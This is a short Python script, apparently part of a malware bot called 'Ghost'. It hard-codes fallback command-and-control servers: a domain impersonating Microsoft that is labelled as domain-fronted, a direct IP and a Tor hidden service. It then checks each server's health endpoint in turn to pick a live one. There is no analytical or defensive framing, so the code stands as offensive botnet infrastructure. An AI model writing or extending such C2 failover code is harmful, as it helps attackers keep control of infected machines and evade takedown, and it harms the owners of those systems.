import requests

# --- Baked into every 'Ghost' Bot ---
C2_NODES = [
    "updates.microsoft-security-cdn.com",   # Primary (Domain Fronted)
    "91.205.xx.xx",                         # Secondary (Direct IP)
    "ghost-backup.onion"                    # Emergency (Tor Hidden Service)
]

def get_active_c2():
    """
    Attempts to contact each C2 node in order.
    Returns the first node that replies to 'https://<node>/health' with HTTP 200.
    Falls back to the next node if unreachable.
    Returns None if all C2 nodes fail.
    """
    for node in C2_NODES:
        try:
            response = requests.get(f"https://{node}/health", timeout=5)
            if response.status_code == 200:
                print(f"[C2] Active node selected: {node}")
                return node
        except Exception:
            continue
    print("[C2] No available C2 nodes found!")
    return None

if __name__ == "__main__":
    active_c2 = get_active_c2()
    print("Active C2 node:", active_c2 if active_c2 else "None")